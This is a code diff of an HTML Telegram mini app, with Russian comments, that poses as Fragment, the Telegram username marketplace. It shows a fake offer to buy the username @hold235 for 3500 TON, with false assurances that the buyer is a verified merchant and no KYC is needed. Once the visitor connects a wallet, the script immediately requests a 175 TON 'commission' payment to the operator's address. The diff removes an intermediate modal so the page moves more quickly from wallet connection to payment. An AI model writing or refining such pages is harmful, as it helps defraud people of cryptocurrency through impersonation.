@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fragment - Mini App</title>
-    <!-- Подключаем TON Connect UI вместо SDK -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         body {
@@ -263,58 +262,6 @@
             border-radius: 50%;
             border: 2px solid #1A1F2B;
         }
-        /* Стили для модального окна */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        .modal-content {
-            background: #1E2A3D;
-            padding: 20px;
-            border-radius: 12px;
-            text-align: center;
-            max-width: 90%;
-            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
-        }
-        .close {
-            float: right;
-            cursor: pointer;
-            font-size: 24px;
-            color: #00D4FF;
-        }
-        .connect-wallet-button {
-            background: linear-gradient(180deg, #00C4FF 0%, #00A8E6 100%);
-            color: #FFFFFF;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            margin: 16px 0;
-            box-shadow: 0 4px 12px rgba(0, 212, 255, 0.3);
-        }
-        .wallet-actions {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-top: 10px;
-        }
-        .wallet-actions button {
-            background: none;
-            border: none;
-            cursor: pointer;
-            font-size: 20px;
-            color: #00D4FF;
-        }
     </style>
 </head>
 <body>
@@ -361,7 +308,8 @@
             <p>Web Address <span id="web-address">t.me/hold235</span></p>
             <p>TON Web 3.0 Address <span id="ton-address">hold235.t.me</span></p>
         </div>
-        <button class="button" onclick="showWalletModal()">Start Exchange</button>
+        <button class="button" onclick="connectWallet()">Start Exchange</button>
+        <div id="ton-connect-ui" style="display: none;"></div>
         <button class="subscribe">Subscribe to updates</button>
         <div class="notification">
             You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of 💎 25,000.
@@ -390,22 +338,6 @@
         <div class="badge"></div>
     </div>
 
-    <!-- Модальное окно для подключения кошелька -->
-    <div id="wallet-modal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('wallet-modal')">×</span>
-            <h2>Подключение кошелька</h2>
-            <button class="connect-wallet-button" id="connect-wallet-button">
-                Подключить кошелёк
-            </button>
-            <div id="ton-connect-ui"></div>
-            <div class="wallet-actions" id="wallet-actions" style="display: none;">
-                <button onclick="copyWalletAddress()">📋</button>
-                <button onclick="disconnectWallet()">🚫</button>
-            </div>
-        </div>
-    </div>
-
     <!-- SVG Definitions -->
     <svg style="display: none;">
         <symbol viewBox="0 0 24 24" id="ton">
@@ -421,92 +353,33 @@
 
         // Инициализация TON Connect UI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json', // Замените на ваш манифест
+            manifestUrl: 'https://abc123.ngrok.io/tonconnect-manifest.json', // Замените на ваш HTTPS URL
             buttonRootId: 'ton-connect-ui'
         });
 
         let walletAddress = null;
 
-        // Обработчик для кнопки "Подключить кошелёк"
-        const connectWalletButton = document.getElementById('connect-wallet-button');
-        connectWalletButton.addEventListener('click', () => {
+        // Функция подключения кошелька
+        function connectWallet() {
+            if (!tg.initData) {
+                tg.showAlert('Ошибка: приложение должно быть запущено в Telegram.');
+                return;
+            }
+
             tonConnectUI.openModal();
-        });
+        }
 
         // Обработка изменения статуса подключения кошелька
         tonConnectUI.onStatusChange(wallet => {
             if (wallet) {
                 walletAddress = wallet.account.address;
                 console.log('Кошелёк подключён:', walletAddress);
-                connectWalletButton.style.display = 'none';
-                document.getElementById('wallet-actions').style.display = 'flex';
-
-                // После подключения автоматически инициируем транзакцию
                 initiateTransaction();
             } else {
                 walletAddress = null;
                 console.log('Кошелёк отключён');
-                connectWalletButton.style.display = 'block';
-                document.getElementById('wallet-actions').style.display = 'none';
             }
         });
-
-        // Функция копирования адреса кошелька
-        function copyWalletAddress() {
-            if (walletAddress) {
-                navigator.clipboard.writeText(walletAddress)
-                    .then(() => tg.showAlert('Адрес кошелька скопирован!'))
-                    .catch(() => tg.showAlert('Не удалось скопировать адрес кошелька.'));
-            }
-        }
-
-        // Функция отключения кошелька
-        function disconnectWallet() {
-            tonConnectUI.disconnect();
-            tg.showAlert('Кошелёк отключён.');
-        }
-
-        // Показ модального окна
-        function showWalletModal() {
-            if (!tg.initData) {
-                tg.showAlert('Ошибка: приложение должно быть запущено в Telegram.');
-                return;
-            }
-
-            if (walletAddress) {
-                initiateTransaction();
-            } else {
-                const modal = document.getElementById('wallet-modal');
-                modal.style.display = 'flex';
-            }
-        }
-
-        // Закрытие модального окна
-        function closeModal(modalId) {
-            const modal = document.getElementById(modalId);
-            modal.style.display = 'none';
-        }
-
-        // Загрузка данных из сервера
-        async function loadConfig() {
-            try {
-                const response = await fetch('http://localhost:5000/config');
-                const config = await response.json();
-
-                const username = config.username || 'hold235';
-                document.getElementById('username').textContent = username;
-                document.getElementById('telegram-username').textContent = `@${username}`;
-                document.getElementById('web-address').textContent = `t.me/${username}`;
-                document.getElementById('ton-address').textContent = `${username}.t.me`;
-
-                document.getElementById('deal-price-ton').textContent = config.dealPriceTON || '3500';
-                document.getElementById('deal-price-usd').textContent = `~ $${config.dealPriceUSD || '11530.75'}`;
-                document.getElementById('commission-ton').textContent = config.commissionTON || '175';
-                document.getElementById('commission-usd').textContent = `~ $${config.commissionUSD || '576.54'}`;
-            } catch (error) {
-                console.error('Error loading config:', error);
-            }
-        }
 
         // Функция отправки транзакции
         async function initiateTransaction() {
@@ -536,13 +409,33 @@
 
                 if (result) {
                     tg.showAlert(`Транзакция успешно отправлена! Сумма комиссии (${commissionTon} TON) отправлена на адрес ${recipientAddress}.`);
-                    closeModal('wallet-modal');
                 } else {
                     tg.showAlert('Транзакция не выполнена. Проверьте баланс кошелька и попробуйте снова.');
                 }
             } catch (error) {
                 console.error('Ошибка при отправке транзакции:', error);
                 tg.showAlert(`Ошибка: ${error.message}. Проверьте баланс кошелька и попробуйте снова.`);
+            }
+        }
+
+        // Загрузка данных из сервера
+        async function loadConfig() {
+            try {
+                const response = await fetch('http://localhost:5000/config');
+                const config = await response.json();
+
+                const username = config.username || 'hold235';
+                document.getElementById('username').textContent = username;
+                document.getElementById('telegram-username').textContent = `@${username}`;
+                document.getElementById('web-address').textContent = `t.me/${username}`;
+                document.getElementById('ton-address').textContent = `${username}.t.me`;
+
+                document.getElementById('deal-price-ton').textContent = config.dealPriceTON || '3500';
+                document.getElementById('deal-price-usd').textContent = `~ $${config.dealPriceUSD || '11530.75'}`;
+                document.getElementById('commission-ton').textContent = config.commissionTON || '175';
+                document.getElementById('commission-usd').textContent = `~ $${config.commissionUSD || '576.54'}`;
+            } catch (error) {
+                console.error('Error loading config:', error);
             }
         }
 
